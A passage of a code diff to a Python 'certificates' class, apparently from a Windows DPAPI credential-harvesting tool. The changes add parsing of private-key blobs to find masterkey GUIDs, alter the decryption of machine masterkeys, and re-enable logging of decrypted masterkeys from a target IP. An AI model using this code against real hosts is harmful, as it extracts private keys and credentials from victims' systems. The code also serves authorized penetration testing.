-                                ////       string filename = string.Format("{0}.pfx", cert.Thumbprint);
-                                ////      File.WriteAllBytes(filename, certificate.Export(X509ContentType.Pkcs12, (string)null));
-                                ////        certificate.Reset();  
-                                ////        certificate = null;
-
-                                //// 2021-01-04: If we want to do it, it would be:
-                                //X509Certificate2 x509 = new X509Certificate2(cert.RawData);
-                                //Convert.ToBase64String(x509.Export(X509ContentType.Pkcs12, (string)null));
-
-                                store.Close();
-                                store = null;
-
-                                break;
-                            }
-                        }
-                        certCollection.Clear();
-
-
-                        if (store != null)
-                        {
-                            store.Close();
-                            store = null;
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("\r\n[X] An exception occurred {0}", ex.Message);
-                }
-            }
-
-            return certificate;
-        }'''
-
+    def get_masterkey_guid_for_privatekey(self, privatekey_bytes: bytes) -> "Any | None":
+        blob= PVKHeader(privatekey_bytes)
+        if len(blob['Remaining']) == 0:
+            return None
+        if blob['SigHeadLen'] > 0:
+            blob=PVKFile_SIG(privatekey_bytes)
+        else:
+            blob=PVKFile(privatekey_bytes)
+        
+        return bin_to_string(blob['Blob']['GuidMasterKey'])
 
     def get_masterkey(self, user, guid, type):
         guid = guid.lower()
@@ -303,7 +540,7 @@ class certificates():
         else:
             if user.type_validated == True:
                 type = user.type
-
+            type = 'MACHINE' if type == 'MACHINE-USER' else type
             if type == 'MACHINE':
                 # Try de decrypt masterkey file
                 for key in self.machine_key:
@@ -369,6 +606,7 @@ class certificates():
                             user.masterkeys_file[guid]['status'] = 'decrypted'
                             user.masterkeys_file[guid]['key'] = decrypted_masterkey
                             # user.masterkeys[localfile] = decrypted_masterkey
+                            
                             user.type = 'MACHINE-USER'
                             user.type_validated = True
                             self.logging.debug(
@@ -405,7 +643,7 @@ class certificates():
                     mydpapi = DPAPI(myoptions, self.logging)
                     decrypted_masterkey = mydpapi.decrypt_masterkey()
                     if decrypted_masterkey != -1 and decrypted_masterkey != None:
-                        # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
+                        self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
                         user.masterkeys_file[guid]['status'] = 'decrypted'
                         user.masterkeys_file[guid]['key'] = decrypted_masterkey
                         # user.masterkeys[localfile] = decrypted_masterkey
@@ -484,7 +722,7 @@ class certificates():
             '''if localfile not in user.masterkeys:
 				user.masterkeys[localfile] = None'''
             if user.masterkeys_file[guid]['status'] == 'encrypted':
-                user.masterkeys_file[guid]['status'] = 'decryption_failed'
+                # user.masterkeys_file[guid]['status'] = 'decryption_failed'
                 self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                          status=user.masterkeys_file[guid]['status'], decrypted_with='',
                                          decrypted_value='',
@@ -493,3 +731,7 @@ class certificates():
                 return -1
             elif user.masterkeys_file[guid]['status'] == 'decrypted':  # Should'nt go here
                 return user.masterkeys_file[guid]
+
+def is_certificate_guid(value: str):
+    guid = re.compile(r'^(\{{0,1}([0-9a-fA-F]{32})_([0-9a-fA-F]{8})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{4})-([0-9a-fA-F]{12})\}{0,1})$')
+    return guid.match(value)
